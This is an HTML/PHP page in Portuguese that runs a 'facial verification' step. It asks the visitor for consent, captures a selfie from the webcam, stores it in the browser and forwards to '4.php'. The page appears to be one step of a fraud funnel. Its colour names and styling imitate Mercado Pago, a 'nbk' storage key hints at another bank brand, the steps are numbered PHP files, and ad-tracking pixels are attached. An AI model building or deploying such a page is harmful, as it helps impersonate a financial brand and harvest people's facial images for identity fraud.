<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação Facial</title>


<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        main {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        #video {
            transform: scaleX(-1);
            min-height: 480px;
            object-fit: cover;
        }

        #photoImg {
            transform: scaleX(-1);
        }

        .camera-overlay {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
        }

        .camera-guide {
            width: 280px;
            height: 360px;
            border: 3px solid #009EE3;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
        }

        @keyframes bounce {
            0%, 100% {
                transform: translateX(-50%) translateY(0);
            }
            50% {
                transform: translateX(-50%) translateY(-10px);
            }
        }

        .scroll-indicator {
            animation: bounce 2s infinite;
        }

        #videoWrap {
            min-height: 480px;
        }
    </style>
</head>
<body class="bg-gray-50">
    <?php include 'header.php'; ?>

    <main class="py-8 px-4 md:py-12">
        <div class="max-w-2xl mx-auto">
            <div id="stepConsent" class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Verificação facial</h1>
                <p class="text-gray-600 mb-8">
                    Para sua segurança, precisamos validar sua identidade com uma foto. O processo é rápido e seguro.
                </p>

                <div class="space-y-4 mb-8">
                    <div class="flex gap-4 p-4 bg-mp-light-blue rounded-xl border border-mp-blue/20">
                        <svg class="w-6 h-6 text-mp-blue flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                        </svg>
                        <div>
                            <div class="font-semibold text-gray-900 mb-1">Uso limitado</div>
                            <div class="text-sm text-gray-600">A foto será usada apenas para validação de identidade no processo de contratação.</div>
                        </div>
                    </div>

                    <div class="flex gap-4 p-4 bg-mp-light-blue rounded-xl border border-mp-blue/20">
                        <svg class="w-6 h-6 text-mp-blue flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
                        </svg>
                        <div>
                            <div class="font-semibold text-gray-900 mb-1">Proteção de dados</div>
                            <div class="text-sm text-gray-600">Seus dados e imagem não serão compartilhados com terceiros sem autorização.</div>
                        </div>
                    </div>

                    <div class="flex gap-4 p-4 bg-mp-light-blue rounded-xl border border-mp-blue/20">
                        <svg class="w-6 h-6 text-mp-blue flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clip-rule="evenodd"/>
                        </svg>
                        <div>
                            <div class="font-semibold text-gray-900 mb-1">Rápido e simples</div>
                            <div class="text-sm text-gray-600">Leva menos de 1 minuto. Confirme e tire a foto.</div>
                        </div>
                    </div>
                </div>

                <p class="text-sm text-gray-600 mb-6">
                    Ao continuar você autoriza a captura e o uso da imagem para validação desta operação.
                </p>

                <div class="flex flex-col sm:flex-row gap-3">
                    <button id="btnCancel" class="flex-1 px-6 py-3 border-2 border-gray-300 text-gray-700 rounded-lg font-semibold hover:bg-gray-50 transition-all">
                        Cancelar
                    </button>
                    <button id="btnAgree" class="flex-1 px-6 py-3 bg-mp-blue text-white rounded-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all">
                        Continuar
                    </button>
                </div>
            </div>

            <div id="stepCamera" class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 hidden">
                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Capturar foto</h1>
                <p class="text-sm text-gray-600 mb-6">
                    Posicione seu rosto dentro do círculo e toque em Capturar.
                </p>

                <div id="videoWrap" class="relative max-w-md mx-auto rounded-xl overflow-hidden bg-black mb-6">
                    <video id="video" autoplay playsinline muted class="w-full block"></video>
                    <div class="camera-overlay">
                        <div class="camera-guide"></div>
                    </div>
                </div>

                <div id="cameraControls" class="flex flex-col sm:flex-row gap-3 justify-center mb-6">
                    <button id="btnRetryCam" class="px-6 py-3 border-2 border-gray-300 text-gray-700 rounded-lg font-semibold hover:bg-gray-50 transition-all">
                        Reiniciar câmera
                    </button>
                    <button id="btnCapture" class="px-6 py-3 bg-mp-blue text-white rounded-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all">
                        Capturar imagem
                    </button>
                </div>

                <div id="captureSuccess" class="hidden bg-green-50 border-2 border-green-500 text-green-800 p-4 rounded-lg text-center font-medium mb-6 fade-in">
                    <svg class="w-5 h-5 inline mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
                    </svg>
                    Foto capturada com sucesso! Analise a imagem abaixo e confirme.
                </div>

                <div id="previewArea" class="hidden max-w-md mx-auto">
                    <img id="photoImg" alt="Foto capturada" class="w-full rounded-xl mb-6 border border-gray-200">
                    <div class="flex flex-col sm:flex-row gap-3 mb-4">
                        <button id="btnUse" class="flex-1 px-6 py-3 bg-mp-blue text-white rounded-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all">
                            Usar esta foto
                        </button>
                        <button id="btnRetake" class="flex-1 px-6 py-3 border-2 border-gray-300 text-gray-700 rounded-lg font-semibold hover:bg-gray-50 transition-all">
                            Tentar novamente
                        </button>
                    </div>
                </div>

                <div id="cameraError" class="hidden text-red-600 text-sm mt-4 text-center p-3 bg-red-50 rounded-lg"></div>
            </div>
        </div>
    </main>

    <div id="scrollIndicator" class="hidden scroll-indicator fixed bottom-5 left-1/2 -translate-x-1/2 bg-mp-blue text-white px-4 py-2 rounded-full text-sm shadow-lg z-50">
        Role para cima para ver sua foto
    </div>

    <?php include 'footer.php'; ?>

    <script>
        const btnAgree = document.getElementById('btnAgree');
        const btnCancel = document.getElementById('btnCancel');
        const stepConsent = document.getElementById('stepConsent');
        const stepCamera = document.getElementById('stepCamera');
        const video = document.getElementById('video');
        const btnCapture = document.getElementById('btnCapture');
        const previewArea = document.getElementById('previewArea');
        const photoImg = document.getElementById('photoImg');
        const btnUse = document.getElementById('btnUse');
        const btnRetake = document.getElementById('btnRetake');
        const btnRetryCam = document.getElementById('btnRetryCam');
        const cameraError = document.getElementById('cameraError');
        const captureSuccess = document.getElementById('captureSuccess');
        const cameraControls = document.getElementById('cameraControls');
        const scrollIndicator = document.getElementById('scrollIndicator');

        let stream = null;
        let capturedDataUrl = null;

        function showStepCamera() {
            stepConsent.classList.add('hidden');
            stepCamera.classList.remove('hidden');
            startCamera();
        }

        function showStepConsent() {
            stepCamera.classList.add('hidden');
            stepConsent.classList.remove('hidden');
            stopCamera();
        }

        btnAgree.addEventListener('click', () => showStepCamera());
        btnCancel.addEventListener('click', () => history.back());

        async function startCamera() {
            cameraError.classList.add('hidden');
            const constraints = {
                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
                audio: false
            };
            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                await video.play();
            } catch(err) {
                console.error('camera error', err);
                cameraError.textContent = 'Não foi possível acessar a câmera. Verifique as permissões e tente novamente.';
                cameraError.classList.remove('hidden');
            }
        }

        function stopCamera() {
            if(stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            video.pause();
            video.srcObject = null;
        }

        btnCapture.addEventListener('click', () => {
            if(!stream) {
                cameraError.textContent = 'Câmera não iniciada.';
                cameraError.classList.remove('hidden');
                return;
            }

            const w = video.videoWidth || 640;
            const h = video.videoHeight || 480;
            const canvas = document.createElement('canvas');
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            ctx.translate(w, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, w, h);
            capturedDataUrl = canvas.toDataURL('image/jpeg', 0.92);

            cameraControls.classList.add('hidden');
            captureSuccess.classList.remove('hidden');
            photoImg.src = capturedDataUrl;
            previewArea.classList.remove('hidden');
            video.style.opacity = '0.1';

            setTimeout(() => {
                if (window.innerWidth <= 768) {
                    previewArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    const previewRect = previewArea.getBoundingClientRect();
                    if (previewRect.top > window.innerHeight || previewRect.bottom < 0) {
                        scrollIndicator.classList.remove('hidden');
                        setTimeout(() => scrollIndicator.classList.add('hidden'), 5000);
                    }
                }
            }, 300);
        });

        btnRetake.addEventListener('click', () => {
            capturedDataUrl = null;
            photoImg.src = '';
            previewArea.classList.add('hidden');
            captureSuccess.classList.add('hidden');
            scrollIndicator.classList.add('hidden');
            cameraControls.classList.remove('hidden');
            video.style.opacity = '1';

            if (window.innerWidth <= 768) {
                document.getElementById('videoWrap').scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        });

        btnRetryCam.addEventListener('click', async () => {
            stopCamera();
            await startCamera();
            cameraError.classList.add('hidden');
            previewArea.classList.add('hidden');
            captureSuccess.classList.add('hidden');
            scrollIndicator.classList.add('hidden');
            cameraControls.classList.remove('hidden');
            video.style.opacity = '1';
        });

        btnUse.addEventListener('click', () => {
            if(!capturedDataUrl) {
                alert('Faça a captura antes de prosseguir.');
                return;
            }

            try {
                localStorage.setItem('nbk_captured_photo', capturedDataUrl);
            } catch(e) {
                console.warn('localStorage error', e);
            }

            btnUse.disabled = true;
            btnUse.textContent = 'Enviando...';
            btnUse.classList.add('bg-green-600', 'hover:bg-green-700');
            btnUse.classList.remove('bg-mp-blue', 'hover:bg-mp-dark-blue');

            const urlParams = new URLSearchParams(window.location.search);
            setTimeout(() => {
                window.location.href = `4.php?${urlParams.toString()}`;
            }, 1000);
        });

        window.addEventListener('pagehide', () => stopCamera());
        window.addEventListener('beforeunload', () => stopCamera());
    </script>
</body>
</html>
